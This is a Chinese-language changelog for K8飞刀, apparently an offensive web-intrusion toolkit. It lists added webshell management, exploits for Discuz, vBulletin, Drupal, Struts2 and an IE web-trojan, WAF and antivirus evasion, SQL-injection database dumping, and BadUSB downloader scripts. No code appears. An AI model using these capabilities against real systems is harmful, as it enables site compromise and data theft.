20150406<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Hacked by&nbsp; 装B脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150324<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Arduino 下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150320<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 帝国备份王万能Cookie登陆后台Exp(需修改时间戳)&nbsp;&nbsp;&nbsp;&nbsp; 20150319<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ecshop管理员md5转成Cookie 可直接进入2.7.x后台&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz产品 SupeSite 6.x 7.x 全版本SQL注入EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz! 7.2 faq.php注入爆表前缀EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vBulletin 3 &amp; 4 ajax.php SQL注入爆管理Exploit&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP URL安全漏洞SQL注入爆管理员EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]GoogleHack&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 新增GoogleHack模块,提高工作效率&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150127<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件下载功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150121<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP文件管理(无权限+禁用图标 空目录+灰色图标)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150120<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(增加Linux列目录功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150120<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(右键增加复制目录结构功能)&nbsp;&nbsp;&nbsp;&nbsp; 20150120<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件删除/列目录更新)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150116<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键发送到相关模块,相关功能优化&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150116<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GET和POST提交-流文件保存功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150115<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件下载到服务器功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150115<br>=================================================================================<br>K8飞刀 20150114<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码保留Get或Post常用的=号和&amp;符 另附单独转换&nbsp;&nbsp; 20150114<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz! X系列产品升级/转换漏洞 GetShell Exp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150114<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复修改EXP附加URL无法更新的bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150114<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell表新增Shell类型字段,用于区分各种提交方式&nbsp; 20150112<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 极速后台扫描(右键增加 复制选中URL 保存扫描结果)&nbsp;&nbsp; 20150109<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件上传功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150108<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Code代码(去掉代码前序号[格式(序号+空格+代码)])&nbsp;&nbsp;&nbsp; 20150107<br>[+]FixBug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复某些功能网络连接卡死的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150107<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善文件管理功能(密码/Ke/证书类-绿色+Key图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150106<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell在控状态检测(以是否能执行代码为标准)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150105<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(脚本配置文件-蓝色+设置图标&nbsp;&nbsp;&nbsp; 20150101<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(常用目录-紫色目录图标显示&nbsp;&nbsp;&nbsp;&nbsp; 20150101<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(WebShell类-普通紫色+黑脸图标&nbsp; 20150101<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(提权类黑客类-高亮紫色+图标)&nbsp;&nbsp; 20141231<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复WebShell图片木马合成不支持空格路径的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141228<br>=================================================================================<br>K8飞刀 20141220<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进制转换(10进制\2进制\8进制\16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141220<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; File2JsHex(文件转成JS16进制 网页内嵌木马常用)&nbsp;&nbsp;&nbsp;&nbsp; 20141219<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell图片木马合成(上传绕过WAF或留包含后门)&nbsp;&nbsp;&nbsp;&nbsp; 20141218<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VBS脚本随机ASCII加密解密(一秒免杀IE神洞网马)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141214<br>=================================================================================<br>K8飞刀 20141208 CSRF专版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Post提交代码(Flash/jQuery/Flash/Python/Perl/PHP)&nbsp; 20141208<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python Post参数 与 常规Post参数 互转(方便写EXP)&nbsp;&nbsp; 20141208<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flash&nbsp; Post参数 与 常规Post参数 互转(XSS-CSRF用)&nbsp; 20141208<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery Post参数 与 常规Post参数 互转(XSS-CSRF用)&nbsp; 20141206<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加WordPress后台主题GetShell代码 + 右键菜单美化&nbsp; 20141203<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加右键复制 Web全部信息 Banner/IP/地址位置信息&nbsp;&nbsp; 20141202<br>=================================================================================<br>K8飞刀 20141130<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 选中URL可右键使用 Firefox\Chrome\IE 浏览器打开&nbsp;&nbsp;&nbsp; 20141128<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 正则截取数据(结果支持同时提取8个参数 灵活度更高)&nbsp; 20141128<br>K8飞刀 20141125 IE神洞版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IE神洞 MS14-065 CVE-2014-6332 网马生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141125<br>[+]XSSanalysis&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS挂马流量分析系统 未完成.. 静请期待&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141125<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP-Chr连接字符串(点号 +号)互转 WebShell常用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141123<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 极速后台扫描(WebShell\PHP\JSP\ASP\ASPX大量字典)&nbsp;&nbsp; 20141120<br>=================================================================================<br>K8飞刀 20141111 光棍专版<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加Banner/IP/地址位置信息 美化各项配置属性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141110<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复不能读取配置文件长字符串的BUG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141107<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自动保存当前脱库配置信息/重起程序后自动加载&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141106<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XP不显示脱库速度/多线程脱库时不能停止的bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141106<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注入点脱库(多线程) + 计算脱库速度&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141104<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 多行字符串 转成 C# StringBuffer代码 开发用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141103<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 相对路径生成 Discuz 6.x/7.x代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141103<br>=================================================================================<br>K8飞刀 20141101<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 代码多行转一行 Bat逻辑命令符转成一行与反转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141101<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XP/2003 工具栏图标按钮位置调整&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141101<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持多国语言编码 (解决不同区域返回乱码问题)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141031<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持多国语言编码 (解决不同区域返回乱码问题)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141031<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Big5(HK)编码,修复脱库时HK繁体乱码的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXP按钮右键添加发送到DataOutput模块功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加robots.txt查看按钮(大部分网站都会有的)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030<br>[+]ExpDebug/Exploit&nbsp;&nbsp; 禁用掉错误提示脚本&nbsp; 添加Discuz 7.2 相关EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141029<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Drupal后台PHP-Chr连接字符串 GetShell代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141027<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP GetShell代码 PHP-Chr连接字符串生成与反转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141027<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 界面直观 (工具栏/右键菜单/Tab头)添加相应图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141025<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Drupal后台 (PHP Filter)模块GetShell 代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141022<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持导入20141022版本前数据库(提示新增EXP数量)&nbsp;&nbsp;&nbsp;&nbsp; 20141022<br>[+]ExploitDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exploit-DB模块 新增自定义 网址 附加URL 参数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141022<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hex编码(GB2312\UTF8\Unicode)&nbsp; Hex解码GB2312&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141019<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入 Hex文件路径(MSSQL) Hex文件路径(Mysql)&nbsp;&nbsp;&nbsp;&nbsp; 20141018<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 界面&nbsp; 编辑框只留一个&nbsp; 加密算法全放置右键菜单&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141017<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; drupal 7.31 SQL注入漏洞 EXP (测试 7.12 7.31)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141017<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 国庆花一天 弄K8工具当年常用时尚透明皮肤(.Net)&nbsp;&nbsp;&nbsp;&nbsp; 20141005<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加数据库(Oracle MYSQL MSSQL)4种CHAR格式解密&nbsp;&nbsp;&nbsp;&nbsp; 20140925<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 所有文本框 右键菜单增加 转大小写 转全半角功能&nbsp;&nbsp;&nbsp;&nbsp; 20140920<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加/修改WebShell 增加高级模式&nbsp; 默认简易模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140908<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Delphi互转其它代码用到&nbsp; 赋值 := 互转 =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140824<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 各语言代码常用 转义字符双引号&nbsp; \" 互转 "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140824<br>[+]CheckUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 检测最否有最新版 提示编译日期并打开URL地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140818<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 脱库模块 SQL注入点脱库 也可用于WebFuzzing&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140814<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复 执行EXP&nbsp; 提交UserAgent只能一次的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140813<br>[+]ExploitDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复浏览器模式提交UserAgent只能一次的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140813<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加 Zimbra LFI 0day exploit 本地包含漏洞&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140812<br>[+]FileManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShellManage右键文件管理模块-PHP列目录完成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140811<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 路径常用符号互转 /转\\&nbsp; \\转/&nbsp; /转\&nbsp; \转/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140811<br>=================================================================================<br>K8飞刀 20140810<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加节日提醒 (公历节日、农历节日)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140810<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Perl Cmd WebShell&nbsp;&nbsp;&nbsp; (Perl一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140807<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python Cmd WebShell&nbsp; (Python一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140806<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion Cmd WebShell (CFM一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 合并数据库(支持导入菜刀数据库) 进行管理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复 WebShell 添加/修改提示对象已释放Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加 WebShell 判断是否已存在 不重复添加&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>=================================================================================<br>K8飞刀 20140731<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加Apache Struts2 S2-020 GetShell EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140731<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 空格转%20 空格转/**/(Struts2漏洞用到)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140731<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加已存在EXP 会提示EXP对应按扭名称&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140729<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 允许添加修改 EXP按钮名称较长字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140729<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 JS Escape默认加密与全部加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 FromCharCode专用ASCII码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 JS转义 (16进制/Unicode)字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 HTML实体编码(10进制/16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>=================================================================================<br>K8飞刀 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加18个Fckeditor 19个Joomla 0day漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加Discuz! 7.2 faq.php 注入 0day漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tipask 2.0 ajaxsearch URL编码注入漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 字符串转Unicode Unicode转字符串 SHA1加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SHA加密算法系列 (SHA256 SHA384 SHA512)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键增加导入合并其它数据库的EXP数据功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Base64 支持3种编码(GB2312 UTF8 Unicode)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码支持3种编码(GB2312 UTF8 Unicode)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 